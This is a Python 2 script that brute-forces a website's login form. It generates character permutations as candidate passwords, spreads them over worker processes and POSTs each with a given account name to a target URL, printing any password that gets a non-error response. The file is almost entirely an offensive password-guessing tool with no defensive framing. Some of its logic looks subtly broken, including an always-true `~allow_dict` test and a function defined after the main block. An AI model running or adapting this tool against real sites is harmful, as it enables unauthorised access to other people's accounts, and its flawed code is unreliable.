import itertools, urllib, urllib2, sys, multiprocessing, os, signal, enchant, time

chunk_size = 50000
allow_number = True
allow_uppercase = False
allow_dict = False
# for thread save
max_job = 5
dictstring = 'abcdefghijklmnopqrstuvwxyz_'

if allow_number:
    dictstring += '0123456789'
    pass

if allow_uppercase:
    dictstring += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    pass

uk = enchant.Dict("en_UK")
us = enchant.Dict("en_US")

def process(temp,url,form,form1,account,jobs,lock):
    global max_job
    while jobs.value >= max_job:
        print 'Processes is full, sleeping...'
        time.sleep(5)
        pass
    with lock:
        jobs.value += 1
    print 'Queue stack in ' + str(jobs.value) + ' jobs.'
    multiprocessing.Process(target=work, args=(temp,url,form,form1,account,jobs,lock,)).start()
    pass

def brute(i, url = '', form = 'account', form1 = 'password', account = '', jobs = None, lock = None):
    temp = []
    for l in itertools.permutations(dictstring, i):
        if allow_dict and filter_dict(''.join(l)):
            temp.append(l)
        elif ~allow_dict:
            temp.append(l)
            pass
        if len(temp) > chunk_size:
            process(temp,url,form,form1,account,jobs,lock)
            del temp[:]
            pass
        pass

    if len(temp)>0:
        process(temp,url,form,form1,account,jobs,lock)
        del temp[:]
        pass
    pass

if __name__ == '__main__':
    try:
    	account = sys.argv[1]
    	n = int(sys.argv[2])
    	m = int(sys.argv[3])
    	url = sys.argv[4]
    	pass
    except Exception, e:
    	print e
    	print 'Error... program is going to be exit...'
    	sys.exit()
    	pass
    try:
    	form = sys.argv[5]
    	pass
    except Exception, e:
    	form = 'account'
    	pass
    try:
    	form1 = sys.argv[6]
    	pass
    except Exception, e:
    	form1 = 'password'
    	pass
    total = 0
    for i in xrange(n,m+1):
        total += pow(len(dictstring), i)
        pass

    # start counter
    jobs = multiprocessing.Value('i', 0)
    lock = multiprocessing.Lock()
    print 'Starting with ' + str(total) + ' answer...'
    del total
    for i in xrange(n,m+1):
    	multiprocessing.Process(target=brute, args=(i,url,form,form1,account,jobs,lock,)).start()

def work(res, url, form, form1, account,jobs,lock):
    for n in res:
        send(url, form, form1, account, ''.join(n))
        pass
    with lock:
        jobs.value -= 1
    print 'Child process is left ... ' + str(jobs.value) + ' jobs in stack.' 
    sys.exit()
    pass

# form => password filed
def send(url, form, form1, account, password):
	try: 
		if urllib2.urlopen(urllib2.Request(url, urllib.urlencode({form : account ,form1 : password}))).getcode() < 400:
			print 'success! ...... password: ' + str(password)
			os.kill(signal.CTRL_C_EVENT, 1)
			pass
		pass
	except Exception, e:
		''
	pass

def filter_dict(words):
    if len(words) < 3:
        return True
        pass
    s = ''
    for x in words:
        s += x
        if len(s) > 2 and (uk.check(s) or us.check(s)):
            return True
            pass
        pass
    pass
